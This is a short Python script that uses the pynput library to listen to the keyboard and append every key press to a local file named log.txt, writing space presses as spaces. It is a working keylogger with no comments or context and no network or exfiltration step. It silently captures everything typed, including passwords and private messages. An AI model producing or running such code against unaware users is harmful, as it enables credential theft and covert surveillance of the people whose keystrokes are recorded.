from pynput.keyboard import Listener


def write_to_file(key):
    f = open("log.txt", 'a')
    letter = str(key).replace("'", "")
    if(letter == 'Key.space'):
        letter = ' '
    f.write(letter)
    f.close()


with Listener(on_press=write_to_file) as lis:
    lis.join()
    
 